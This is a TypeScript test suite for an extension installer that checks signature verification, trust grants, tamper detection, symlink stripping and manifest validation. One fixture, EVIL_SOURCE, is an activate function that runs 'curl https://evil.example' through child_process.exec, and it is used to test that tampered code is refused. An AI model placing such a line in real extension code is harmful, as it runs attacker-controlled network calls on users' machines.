import assert from 'node:assert/strict'
import { existsSync, readdirSync } from 'fs'
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'fs/promises'
import { tmpdir } from 'os'
import { join } from 'path'

import { test } from 'vitest'

import { STUDIO_EXTENSION_VERSION } from '../../../packages/extension-sdk/src/extension-manifest'
import {
  EMPTY_WORKER_SOURCE,
  extensionManifest,
  newExtensionSigner,
  writeExtensionFolder,
} from '../../../tests/extension-folder'
import type { ModuleSigningKeyPair } from '../../../packages/extension-sdk/src/signing'
import { extensionContentSync, type ModuleTrustContext } from './module-signature'
import { discoverUserModules, discoverUserModulesSync, installModuleFolder } from './user-module-registry'

const EMPTY_TRUST: ModuleTrustContext = { trustedModules: new Map() }
const EVIL_SOURCE = "exports.activate = () => require('child_process').exec('curl https://evil.example')\n"

// The next minor Studio after the newest this one reads.
const NEXT_STUDIO = (() => {
  const [major, minor] = STUDIO_EXTENSION_VERSION.split('.').map(Number)
  return `${major}.${minor! + 1}.0`
})()

async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
  const dir = await mkdtemp(join(tmpdir(), 'mc-modules-'))
  try {
    return await fn(dir)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
}

function keyTrust(signer: ModuleSigningKeyPair): ModuleTrustContext {
  return { trustedModules: new Map(), trustedKeyFingerprints: new Set([signer.fingerprint]) }
}

function grantFor(key: string, folder: string): ModuleTrustContext {
  const content = extensionContentSync(folder)
  assert.ok(content.ok)
  return { trustedModules: new Map([[key, content.fingerprint]]) }
}

test('an unsigned extension installs as local.<id>, untrusted, and is discovered', async () => {
  await withTempDir(async (dir) => {
    const src = writeExtensionFolder(join(dir, 'anything'))
    const root = join(dir, 'extensions')

    const install = await installModuleFolder(src, root, EMPTY_TRUST)
    assert.equal(install.ok, true)
    if (install.ok) {
      assert.equal(install.id, 'local.demo')
      assert.equal(install.trust.status, 'unsigned', 'a fresh unsigned extension is untrusted')
      assert.deepEqual(install.strippedLinks, [])
    }
    assert.equal(existsSync(join(root, 'local.demo', 'extension.json')), true)

    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(
      listed.modules.map((m) => m.key),
      ['local.demo'],
    )
    const [module] = listed.modules
    assert.equal(module!.publisher, 'local')
    assert.equal(module!.extension.id, 'demo')
    assert.equal(module!.moduleRoot, join(root, 'local.demo'))
    assert.equal(module!.trust.status, 'unsigned')
    assert.deepEqual(module!.manifest, {
      id: 'local.demo',
      displayName: 'Demo',
      version: '1.0.0',
      publisher: 'local',
      summary: 'A demo.',
      defaultEnabled: true,
      source: 'third-party',
      permissions: ['storage'],
    })
    assert.equal(listed.rejected.length, 0)

    const syncListed = discoverUserModulesSync(root, EMPTY_TRUST)
    assert.deepEqual(
      syncListed.modules.map((m) => m.key),
      ['local.demo'],
    )
    assert.equal(syncListed.modules[0]!.trust.status, 'unsigned')
    assert.equal(syncListed.rejected.length, 0)
  })
})

// A re-install REPLACES the folder. A file the previous version shipped and
// this one does not is gone afterwards, so it cannot keep loading.
test('a reinstall replaces the folder rather than merging into it', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    const installed = join(root, 'local.demo')

    const first = writeExtensionFolder(join(dir, 'v1'), {
      files: { 'dist/main.cjs': EMPTY_WORKER_SOURCE, 'dist/old.cjs': 'module.exports = 1', 'leftover.txt': 'stale' },
    })
    assert.equal((await installModuleFolder(first, root, EMPTY_TRUST)).ok, true)
    assert.equal(existsSync(join(installed, 'leftover.txt')), true)

    const second = writeExtensionFolder(join(dir, 'v2'), { manifest: extensionManifest({ version: '2.0.0' }) })
    assert.equal((await installModuleFolder(second, root, EMPTY_TRUST)).ok, true)

    assert.equal(existsSync(join(installed, 'dist', 'main.cjs')), true, 'the new files are there')
    assert.equal(existsSync(join(installed, 'leftover.txt')), false, 'a file the new version does not ship is gone')
    assert.equal(existsSync(join(installed, 'dist', 'old.cjs')), false, 'and so is stale code')

    // The install staging folder never survives, and never shows up as an extension.
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(
      listed.modules.map((entry) => [entry.key, entry.extension.version]),
      [['local.demo', '2.0.0']],
    )
    assert.deepEqual(listed.rejected, [])
    assert.deepEqual(
      readdirSync(root).filter((name) => name.startsWith('.')),
      [],
    )
  })
})

test('a grant trusts the content it was given for, and nothing else', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    const moduleRoot = writeExtensionFolder(join(root, 'local.demo'))
    const granted = grantFor('local.demo', moduleRoot)
    const trusted = (await discoverUserModules(root, granted)).modules[0]!.trust
    assert.equal(trusted.status, 'trusted')
    assert.equal(trusted.via, 'grant')
    // A stale/wrong fingerprint does not trust.
    const stale = await discoverUserModules(root, { trustedModules: new Map([['local.demo', 'deadbeef']]) })
    assert.equal(stale.modules[0]!.trust.status, 'unsigned')
    // Swapping the code voids the grant.
    await writeFile(join(moduleRoot, 'dist', 'main.cjs'), EVIL_SOURCE)
    assert.equal((await discoverUserModules(root, granted)).modules[0]!.trust.status, 'unsigned')
  })
})

test('the install result carries the content fingerprint a grant binds to', async () => {
  await withTempDir(async (dir) => {
    const src = writeExtensionFolder(join(dir, 'src'), { signer: newExtensionSigner() })
    const root = join(dir, 'extensions')
    const install = await installModuleFolder(src, root, EMPTY_TRUST)
    assert.equal(install.ok, true)
    if (!install.ok) return
    assert.equal(install.trust.status, 'signed')
    const content = extensionContentSync(join(root, 'local.demo'))
    assert.ok(content.ok)
    assert.equal(install.trust.contentFingerprint, content.fingerprint)
  })
})

test('an id only Studio’s own catalogue installs is refused from a folder', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    for (const id of ['studio-notes', 'sprintengine-notes']) {
      const src = writeExtensionFolder(join(dir, id), { manifest: extensionManifest({ id }) })
      const install = await installModuleFolder(src, root, EMPTY_TRUST)
      assert.equal(install.ok, false, `${id} is refused`)
      if (install.ok) return
      assert.match(install.message, /only Studio’s own catalogue installs/)
      assert.equal(install.rejected.issues[0]!.path, 'id')
    }
    assert.equal(existsSync(root), false, 'nothing was written')
  })
})

test('a signed extension from a trusted publisher key installs trusted', async () => {
  await withTempDir(async (dir) => {
    const signer = newExtensionSigner()
    const src = writeExtensionFolder(join(dir, 'src'), { signer })
    const root = join(dir, 'extensions')
    const install = await installModuleFolder(src, root, keyTrust(signer))
    assert.equal(install.ok, true)
    if (!install.ok) return
    assert.equal(install.trust.status, 'trusted')
    const listed = await discoverUserModules(root, keyTrust(signer))
    assert.equal(listed.modules[0]!.trust.status, 'trusted')
    assert.equal(listed.modules[0]!.trust.via, 'publisher')
    assert.equal(listed.modules[0]!.trust.fingerprint, signer.fingerprint)
  })
})

test('a modified code file is refused as tampered', async () => {
  await withTempDir(async (dir) => {
    const signer = newExtensionSigner()
    const src = writeExtensionFolder(join(dir, 'src'), { signer })
    await writeFile(join(src, 'dist', 'main.cjs'), EVIL_SOURCE)
    const install = await installModuleFolder(src, join(dir, 'extensions'), keyTrust(signer))
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.match(install.message, /changed since it was signed/)
    assert.deepEqual(install.rejected.issues, [
      { path: 'files.dist/main.cjs', message: 'does not match the signed digests.' },
    ])
    assert.equal(existsSync(join(dir, 'extensions', 'local.demo')), false)
  })
})

test('an extra file the signed digests do not list is refused', async () => {
  await withTempDir(async (dir) => {
    const signer = newExtensionSigner()
    const src = writeExtensionFolder(join(dir, 'src'), { signer })
    await writeFile(join(src, 'dist', 'extra.cjs'), EVIL_SOURCE)
    const install = await installModuleFolder(src, join(dir, 'extensions'), keyTrust(signer))
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.deepEqual(install.rejected.issues, [
      { path: 'files.dist/extra.cjs', message: 'is not listed in the signed digests.' },
    ])
  })
})

test('an extension.sig that does not verify is refused', async () => {
  await withTempDir(async (dir) => {
    const src = writeExtensionFolder(join(dir, 'src'))
    await writeFile(join(src, 'extension.sig'), '{}')
    const install = await installModuleFolder(src, join(dir, 'extensions'), EMPTY_TRUST)
    assert.equal(install.ok, false)
    if (!install.ok) assert.match(install.message, /invalid signature/)
  })
})

test('symbolic links are left out of the copy and reported', async () => {
  await withTempDir(async (dir) => {
    await writeFile(join(dir, 'outside.cjs'), EVIL_SOURCE)
    const src = writeExtensionFolder(join(dir, 'src'))
    await symlink(join(dir, 'outside.cjs'), join(src, 'dist', 'linked.cjs'))
    await symlink(join(dir, 'outside.cjs'), join(src, 'top-link.cjs'))
    const root = join(dir, 'extensions')
    const install = await installModuleFolder(src, root, EMPTY_TRUST)
    assert.equal(install.ok, true)
    if (!install.ok) return
    assert.deepEqual(install.strippedLinks, ['dist/linked.cjs', 'top-link.cjs'])
    assert.equal(existsSync(join(root, 'local.demo', 'dist', 'linked.cjs')), false)
    assert.equal(existsSync(join(root, 'local.demo', 'top-link.cjs')), false)
    assert.equal(existsSync(join(root, 'local.demo', 'dist', 'main.cjs')), true)
    // What was installed has no link left in it, so it has a content identity to trust.
    assert.equal(typeof install.trust.contentFingerprint, 'string')
  })
})

test('a signed extension whose signed file is a link is refused: the copy lacks it', async () => {
  await withTempDir(async (dir) => {
    const signer = newExtensionSigner()
    const src = writeExtensionFolder(join(dir, 'src'), { signer })
    await writeFile(join(dir, 'outside.cjs'), EMPTY_WORKER_SOURCE)
    await rm(join(src, 'dist', 'main.cjs'))
    await symlink(join(dir, 'outside.cjs'), join(src, 'dist', 'main.cjs'))
    const install = await installModuleFolder(src, join(dir, 'extensions'), keyTrust(signer))
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.deepEqual(install.rejected.issues, [
      { path: 'files.dist/main.cjs', message: 'listed in the signed digests but missing.' },
    ])
  })
})

test('a folder carrying .git or node_modules is refused with a pointer to pack', async () => {
  await withTempDir(async (dir) => {
    const src = writeExtensionFolder(join(dir, 'src'), {
      files: { 'dist/main.cjs': EMPTY_WORKER_SOURCE, '.git/HEAD': 'ref: refs/heads/main\n' },
    })
    const install = await installModuleFolder(src, join(dir, 'extensions'), EMPTY_TRUST)
    assert.equal(install.ok, false)
    if (!install.ok) assert.match(install.message, /sprintengine-extension pack/)
  })
})

test('a folder without extension.json, or with an invalid one, does not install', async () => {
  await withTempDir(async (dir) => {
    const empty = join(dir, 'empty')
    await mkdir(empty)
    const missing = await installModuleFolder(empty, join(dir, 'extensions'), EMPTY_TRUST)
    assert.equal(missing.ok, false)
    if (!missing.ok) assert.equal(missing.message, 'No extension.json found in the selected folder.')

    const invalid = writeExtensionFolder(join(dir, 'invalid'), { manifest: extensionManifest({ tier: 'content' }) })
    const refused = await installModuleFolder(invalid, join(dir, 'extensions'), EMPTY_TRUST)
    assert.equal(refused.ok, false)
    if (!refused.ok) {
      assert.equal(refused.message, 'The extension’s extension.json is invalid.')
      assert.ok(refused.rejected.issues.length > 0)
    }
  })
})

test('an extension written for a newer Studio is refused by install and by discovery', async () => {
  await withTempDir(async (dir) => {
    const manifest = extensionManifest({ engines: { studio: `>=${NEXT_STUDIO}` } })
    const src = writeExtensionFolder(join(dir, 'src'), { manifest })
    const install = await installModuleFolder(src, join(dir, 'extensions'), EMPTY_TRUST)
    assert.equal(install.ok, false)
    if (!install.ok) {
      assert.match(install.message, new RegExp(`needs Studio ${NEXT_STUDIO.replaceAll('.', '\\.')} or newer`))
      assert.equal(install.rejected.issues[0]!.path, 'engines.studio')
    }

    const root = join(dir, 'extensions')
    writeExtensionFolder(join(root, 'local.demo'), { manifest })
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    assert.equal(listed.rejected.length, 1)
    assert.equal(listed.rejected[0]!.issues[0]!.path, 'engines.studio')
    assert.match(listed.rejected[0]!.issues[0]!.message, /needs Studio/)
  })
})

test('a folder whose name is not an install key is rejected', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    for (const name of ['demo', 'Acme.demo', '.demo-staging', 'local.demo.extra']) {
      writeExtensionFolder(join(root, name))
    }
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    // The dotted folder is staging, never an extension, so it is not listed as rejected either.
    assert.deepEqual(listed.rejected.map((rejection) => rejection.path).sort(), [
      join(root, 'Acme.demo', 'extension.json'),
      join(root, 'demo', 'extension.json'),
      join(root, 'local.demo.extra', 'extension.json'),
    ])
    for (const rejection of listed.rejected) {
      assert.match(rejection.issues[0]!.message, /is not an install key/)
    }
  })
})

test('a folder whose manifest id differs from its install key is rejected', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    writeExtensionFolder(join(root, 'local.wrong'), { manifest: extensionManifest({ id: 'demo' }) })
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    assert.equal(listed.rejected.length, 1)
    assert.deepEqual(listed.rejected[0]!.issues, [
      { path: 'id', message: '"demo" must match its folder "local.wrong".' },
    ])
    assert.equal(discoverUserModulesSync(root, EMPTY_TRUST).rejected.length, 1)
  })
})

test('only a folder install’s key is discovered: another publisher, or a reserved id, is rejected', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    writeExtensionFolder(join(root, 'acme.demo'))
    writeExtensionFolder(join(root, 'sprintengine.demo'))
    writeExtensionFolder(join(root, 'local.studio-x'), { manifest: extensionManifest({ id: 'studio-x' }) })
    writeExtensionFolder(join(root, 'local.demo'))
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(
      listed.modules.map((module) => [module.key, module.publisher, module.manifest.publisher]),
      [['local.demo', 'local', 'local']],
    )
    assert.deepEqual(listed.rejected.map((rejection) => rejection.path.split(/[\\/]/).at(-2)).sort(), [
      'acme.demo',
      'local.studio-x',
      'sprintengine.demo',
    ])
  })
})

test('a linked folder installs what it points at, and a linked extension.json is refused', async () => {
  await withTempDir(async (dir) => {
    const src = writeExtensionFolder(join(dir, 'src'))
    await symlink(src, join(dir, 'linked-src'))
    const root = join(dir, 'extensions')
    const install = await installModuleFolder(join(dir, 'linked-src'), root, EMPTY_TRUST)
    assert.equal(install.ok, true, install.ok ? '' : install.message)
    assert.equal(existsSync(join(root, 'local.demo', 'extension.json')), true)
    assert.equal((await discoverUserModules(root, EMPTY_TRUST)).modules.length, 1)

    const other = writeExtensionFolder(join(dir, 'other'))
    await writeFile(join(dir, 'real.json'), JSON.stringify(extensionManifest({ id: 'other' })))
    await rm(join(other, 'extension.json'))
    await symlink(join(dir, 'real.json'), join(other, 'extension.json'))
    const refused = await installModuleFolder(other, root, EMPTY_TRUST)
    assert.equal(refused.ok, false)
    if (!refused.ok) assert.match(refused.message, /symbolic link/)
    assert.equal(existsSync(join(root, 'local.other')), false)
  })
})

test('an unparseable manifest, or a folder with none, is rejected', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    writeExtensionFolder(join(root, 'local.broken'), { manifest: '{ not json' })
    await mkdir(join(root, 'local.empty'), { recursive: true })
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    assert.equal(listed.rejected.length, 2)
    const broken = listed.rejected.find((rejection) => rejection.path.includes('local.broken'))
    assert.match(broken?.issues[0]?.message ?? '', /is not JSON/)
  })
})

test('a manifest.json alone is not an extension', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'extensions')
    await mkdir(join(root, 'local.demo'), { recursive: true })
    await writeFile(join(root, 'local.demo', 'manifest.json'), JSON.stringify({ id: 'demo', version: 1 }))
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    assert.equal(listed.rejected.length, 1)
    assert.equal(listed.rejected[0]!.path, join(root, 'local.demo', 'extension.json'))
  })
})
